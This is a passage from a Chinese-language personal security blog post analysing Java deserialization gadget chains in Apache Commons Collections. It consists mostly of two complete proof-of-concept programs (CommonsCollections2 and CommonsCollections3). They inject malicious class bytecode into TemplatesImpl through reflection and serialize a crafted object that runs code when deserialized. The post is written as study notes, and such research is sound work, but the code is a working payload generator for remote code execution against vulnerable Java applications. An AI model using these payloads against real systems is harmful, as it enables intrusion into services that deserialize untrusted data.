class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> src.com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, CannotCompileException, NotFoundException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">//1.封装TemplatesImpl实例</span></span><br><span class="line">        TemplatesImpl tmp = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//获取默认类池</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//加入我们的恶意类</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(EvalClass.class));</span><br><span class="line">        <span class="comment">//获取pool中的EvalClass</span></span><br><span class="line">        CtClass pay = pool.get(EvalClass.class.getName());</span><br><span class="line">        <span class="comment">//获取Eval类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] PayCode = pay.toBytecode();</span><br><span class="line">        Class clazz;</span><br><span class="line">        clazz  = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        <span class="comment">//为私有属性_bytecodes赋值，即恶意类的字节码</span></span><br><span class="line">        Field tf = clazz.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        tf.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tf.set(tmp,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;PayCode&#125;);</span><br><span class="line">        <span class="comment">//为私有属性_name赋值，内容任意</span></span><br><span class="line">        Field name = clazz.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(tmp,<span class="string">"gqy"</span>);</span><br><span class="line">        <span class="comment">//2.封装PriorityQueue实例</span></span><br><span class="line">        PriorityQueue queue = <span class="keyword">new</span> PriorityQueue(<span class="number">2</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//实例化一个InvokerTransformer，因为只调用一次，无需使用transformerChain</span></span><br><span class="line"><span class="comment">//        InvokerTransformer trans = new InvokerTransformer("newTransformer",new Class[0],new Object[0]);</span></span><br><span class="line">        InvokerTransformer trans = <span class="keyword">new</span> InvokerTransformer(<span class="string">"getOutputProperties"</span>,<span class="keyword">new</span> Class[<span class="number">0</span>],<span class="keyword">new</span> Object[<span class="number">0</span>]); <span class="comment">//调用该方法一样的效果</span></span><br><span class="line">        <span class="comment">//实例化TransformingComparator</span></span><br><span class="line">        TransformingComparator com = <span class="keyword">new</span> TransformingComparator(trans);</span><br><span class="line">        <span class="comment">//设置私有属性comparator</span></span><br><span class="line">        Field ComFi = PriorityQueue.class.getDeclaredField(<span class="string">"comparator"</span>);</span><br><span class="line">        ComFi.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        ComFi.set(queue,com);</span><br><span class="line">        <span class="comment">//设置私有属性queue，//将templasImpl实例放入队列，在比较的时候会传入invokertransform的transform函数</span></span><br><span class="line">        Field qu = PriorityQueue.class.getDeclaredField(<span class="string">"queue"</span>);</span><br><span class="line">        qu.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object[] objOutput = (Object[])qu.get(queue);</span><br><span class="line">        objOutput[<span class="number">0</span>] = tmp;</span><br><span class="line">        objOutput[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="comment">//3.序列化</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(queue);</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="comment">//4.反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/04/15/lcNhiD6PetX7r8s.png" alt="Snipaste_2020-04-15_19-29-56.png"></p>
<p>分析是一回事，写poc是另一回事。</p>
<hr>
<h4><span id="commonscollections3">CommonsCollections3</span></h4><p><strong>Gadget chain</strong></p>
<p><img src="https://i.loli.net/2020/04/15/lKOYTjFQPm3cd2s.png" alt="Snipaste_2020-04-15_19-41-22.png"></p>
<p><strong>适用版本</strong>：3.1-3.2.1，jdk7u21及以前 </p>
<p>入口和CC1相同，不同的是后面找到了<code>InstantiateTransformer</code>类，</p>
<p><img src="https://i.loli.net/2020/04/15/PE5m21eO7l6FCZt.png" alt="Snipaste_2020-04-15_20-19-08.png"></p>
<p>因为<code>AnnotationInvocationHandler</code>+<code>LazyMap.get()</code>不存在的key导致key不可控，因此只需要<code>chainedTransformer</code>第一个<code>transfomer</code>为<code>constanttransformer</code>即可，这里用到了类<code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code></p>
<p><img src="https://i.loli.net/2020/04/15/ltDYwZ64d2fkeOc.png" alt="Snipaste_2020-04-15_20-29-55.png"></p>
<p>传入一个<code>Templates</code>实例，调用了<code>templates.newTransformer()</code>，正是我们想要的（参考CC2中最后一步）</p>
<p>POC</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.*;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException, NotFoundException, IOException, CannotCompileException </span>&#123;</span><br><span class="line">        <span class="comment">//1.封装TemplatesImpl实例</span></span><br><span class="line">        TemplatesImpl tmp = <span class="keyword">new</span> TemplatesImpl();</span><br><span class="line">        <span class="comment">//获取默认类池</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//加入我们的恶意类</span></span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> ClassClassPath(EvalClass.class));</span><br><span class="line">        <span class="comment">//获取pool中的EvalClass</span></span><br><span class="line">        CtClass pay = pool.get(EvalClass.class.getName());</span><br><span class="line">        <span class="comment">//获取Eval类的字节码</span></span><br><span class="line">        <span class="keyword">byte</span>[] PayCode = pay.toBytecode();</span><br><span class="line">        Class clazz;</span><br><span class="line">        clazz  = Class.forName(<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>);</span><br><span class="line">        <span class="comment">//为私有属性_bytecodes赋值，即恶意类的字节码</span></span><br><span class="line">        Field tf = clazz.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        tf.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tf.set(tmp,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;PayCode&#125;);</span><br><span class="line">        <span class="comment">//为私有属性_name赋值，内容任意</span></span><br><span class="line">        Field name = clazz.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(tmp,<span class="string">"gqy"</span>);</span><br><span class="line">        <span class="comment">//2.封装chained和lazymap</span></span><br><span class="line">        Transformer[] trans = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//ConstantTransformer会将参数原样返回</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//传入我们的TemplatesImpl实例，会在构造函数中调用templates.newTransformer()</span></span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmp&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(trans);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="comment">//3.将proxy代理放进外层的AnnotationInvocationHandler，从而membervalues.entryset触发动态代理（与commonscollection1相同）</span></span><br><span class="line">        String clazzName = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类的构造方法数组</span></span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(clazzName).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法</span></span><br><span class="line">        InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="comment">//Proxy.newProxyInstance的三个参数</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数</span></span><br><span class="line"><span class="comment">          第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象</span></span><br><span class="line"><span class="comment">          第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法</span></span><br><span class="line"><span class="comment">          第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        InvocationHandler poc = (InvocationHandler)ctor.newInstance(Override.class, Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler));</span><br><span class="line">        <span class="comment">//4.序列化</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(poc);</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="comment">//5.反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>后面还有几条，未完待续</p>
<p>但是通过前面几条可以看到利用的知识主要是动态代理，javassist动态编程，反射等，加上寻找一些类的组合利用。</p>
<h4><span id="参考链接">参考链接</span></h4><p> <a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/214096.html</a> </p>
<p> <a href="https://www.anquanke.com/post/id/200637" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200637</a></p>

            </div>
          

    
      <footer class="post-footer">

        
         <div>    
          
          <ul class="post-copyright">
             <li class="post-copyright-link">
              <strong>本文作者：</strong>
              <a href="/" title="欢迎访问 glotozz 的个人博客">glotozz</a>
            </li>

            <li class="post-copyright-license">
              <strong>版权声明： </strong>
               本博客所有文章除特别声明外，均采用 CC BY-NC-SA 4.0 许可协议。转载请注明出处！
            </li>
          </ul>
        
      </div>
      
        <div class="post-tags">
          
            <a href="/tags/java/" rel="tag"><i class="fa fa-tag"></i> java</a>
          
        </div>
      

        
        
  <nav class="post-nav">
    
      <a class="prev" href="/2020/04/15/Java-Sec-Code%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">Java Sec Code学习笔记</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    
    
      <a class="next" href="/2020/04/14/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-S2-046/">
        <span class="next-text nav-default">Java漏洞学习-S2-046</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    
  </nav>

        
  <div class="comments" id="comments">
    
      <div id="vcomments"></div>
    
  </div>


      </footer>
    
  </article>

    </div>

      </div>

      <footer id="colophon">
<span class="copyright-year">
    
        &copy;
    
    2020
    <span class="footer-author">glotozz.</span>
    <span class="power-by">
        Powered by <a class="hexo-link" href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> and <a class="theme-link" href="https://github.com/frostfan/hexo-theme-polarbear" target="_blank" rel="noopener">Polar Bear</a>
    </span>
</span>

      </footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div>
    



  
<!-- valine Comments -->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
